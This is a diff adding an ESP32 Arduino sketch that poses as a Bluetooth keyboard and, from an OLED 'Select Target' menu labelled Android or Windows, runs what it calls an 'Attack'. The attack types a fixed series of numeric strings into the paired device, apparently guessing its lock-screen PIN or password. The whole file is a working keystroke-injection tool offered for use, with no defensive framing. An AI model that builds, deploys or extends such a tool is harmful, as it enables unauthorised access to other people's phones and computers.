@@ -1,0 +1,198 @@
+//This program create by TechChip
+//ESP32 BLE HID
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+#include <Fonts/FreeSansBold12pt7b.h>
+
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
+#include <BleKeyboard.h>
+
+#define BUTTON_1_PIN 19 // Trigger 1
+#define BUTTON_2_PIN 5 // Trigger 2
+
+char kbd[] = "ESP Keyboard"; //Device Name
+BleKeyboard bleKeyboard(kbd, "Espressif", 100);
+
+int selectedOption = 0;
+
+const char* menuItems[] = {
+  "1. Android",
+  "2. Windows",
+  "3. iOS"
+};
+
+bool lastMenuButton = HIGH;
+bool lastSelectButton = HIGH;
+bool lastState1 = HIGH;
+bool lastState2 = HIGH;
+bool lastState3 = HIGH;
+bool oledConnectedShown = false;
+
+void showMessage(String line1, String line2 = "") {
+  display.clearDisplay();
+  display.drawRect(0, 0, 128, 64, SSD1306_WHITE);
+  display.setTextSize(2);
+  display.setTextColor(SSD1306_WHITE);
+  //display.setFont(&FreeSansBold12pt7b);
+
+  int16_t x1, y1;
+  uint16_t w, h;
+
+  display.getTextBounds(line1, 0, 0, &x1, &y1, &w, &h);
+  display.setCursor((128 - w) / 2, 12);
+  display.println(line1);
+
+  if (line2 != "") {
+    display.getTextBounds(line2, 0, 0, &x1, &y1, &w, &h);
+    display.setCursor((128 - w) / 2, 38);
+    display.println(line2);
+  }
+
+  display.display();
+}
+
+void drawMenu() {
+
+  display.clearDisplay();
+
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+
+  display.setCursor(0, 0);
+  display.println("Select Target");
+
+  for (int i = 0; i < 2; i++) {
+
+    display.setCursor(10, 20 + (i * 15));
+
+    if (i == selectedOption) {
+      display.print("> ");
+    } else {
+      display.print("  ");
+    }
+
+    display.println(menuItems[i]);
+  }
+
+  display.display();
+}
+
+void setup() {
+
+  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println("SSD1306 allocation failed");
+    for(;;);
+  }
+
+  showMessage("Welcome !", "HACKER");
+  delay(2000);
+
+  showMessage("Waiting", "for BLE");
+  drawMenu();
+
+  Serial.begin(115200);
+
+  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_2_PIN, INPUT_PULLUP);
+
+  bleKeyboard.begin();
+}
+
+void loop() {
+
+  if (bleKeyboard.isConnected()) {
+    if (!oledConnectedShown) {
+      showMessage("BLE", "Connected");
+      oledConnectedShown = true;
+    }
+
+    bool menuButton   = digitalRead(BUTTON_1_PIN);
+    bool selectButton = digitalRead(BUTTON_2_PIN);
+
+    // -----------------------------
+    // Cycle through options
+    // -----------------------------
+    if (lastMenuButton == HIGH && menuButton == LOW) {
+
+      selectedOption++;
+
+      if (selectedOption > 1) {
+        selectedOption = 0;
+      }
+
+      drawMenu();
+      delay(200);
+    }
+
+    // -----------------------------
+    // Select option
+    // -----------------------------
+    if (lastSelectButton == HIGH && selectButton == LOW) {
+
+      if (selectedOption == 0) {
+
+        showMessage("1", "Android");
+        delay(500);
+        showMessage("Starting", "Attack");
+        delay(500);
+
+        // Trigger 1 :
+        bleKeyboard.press('1');
+        delay(500);
+        bleKeyboard.press('1');
+        delay(500);
+        bleKeyboard.press('1');
+        delay(500);
+        bleKeyboard.press(KEY_BACKSPACE);
+        delay(2000);
+        bleKeyboard.release(KEY_BACKSPACE);
+        delay(500);
+        bleKeyboard.print("99688");
+        delay(500);
+        bleKeyboard.print("299688");
+        delay(500);
+        bleKeyboard.print("199608");
+        delay(500);
+        bleKeyboard.releaseAll();
+        delay(1000);
+
+      } else {
+
+        showMessage("2", "Windows");
+        delay(500);
+        showMessage("Starting", "Attack");
+        delay(500);
+        // Trigger 2:
+        bleKeyboard.print("1994");
+        delay(5000);
+        bleKeyboard.print("1992");
+        delay(5000);
+        bleKeyboard.print("1");
+        delay(500);
+        bleKeyboard.print("9");
+        delay(500);
+        bleKeyboard.print("9");
+        delay(500);
+        bleKeyboard.print("6");
+        delay(500);
+        bleKeyboard.releaseAll();
+        delay(500);
+        showMessage("Attack", "Complete");
+      }
+      delay(1000);
+      drawMenu();
+    }
+    // Update button states
+    lastMenuButton = menuButton;
+    lastSelectButton = selectButton;
+  } else {
+        Serial.println("BLE HID Disconnected");
+        showMessage("Waiting", "for BLE");
+    }
+
+  delay(10);
+}
